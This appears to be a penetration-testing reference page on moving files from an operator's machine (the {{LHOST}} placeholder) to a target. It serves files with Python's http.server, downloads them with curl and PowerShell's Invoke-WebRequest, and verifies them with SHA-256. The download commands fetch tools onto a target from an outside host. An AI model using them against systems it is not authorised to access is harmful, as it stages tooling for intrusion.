---
title: File transfers
order: 2
tags: [transfer, download, http, curl, powershell, sha256]
---

## Serving files

On the operator machine, prepare ./transfer with only the intended files. Replace tool.bin or tool.exe below with the actual filename.

```bash
python3 -m http.server 8000 --bind {{LHOST}} --directory ./transfer
```

Symbolic links can escape the document root. [Python http.server](https://docs.python.org/3/library/http.server.html).

## Downloading on Linux

Run on the target, in the intended destination directory.

```bash
curl -f -o tool.bin 'http://{{LHOST}}:8000/tool.bin'
```

-f fails HTTP error responses; verify the resulting file before use. [curl manual](https://curl.se/docs/manpage.html).

## Downloading on Windows

Run in target PowerShell, in the intended destination directory.

```powershell
Invoke-WebRequest -Uri 'http://{{LHOST}}:8000/tool.exe' -OutFile '.\tool.exe'
```

The full cmdlet name avoids curl alias differences. [Microsoft reference](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.5).

## Verify a transferred file

Compare SHA-256 with the same file on the serving machine.

```bash
sha256sum tool.bin
```

```powershell
Get-FileHash '.\tool.exe' -Algorithm SHA256
```

[GNU SHA-2 tools](https://www.gnu.org/software/coreutils/manual/html_node/sha2-utilities.html), [Get-FileHash](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.5).
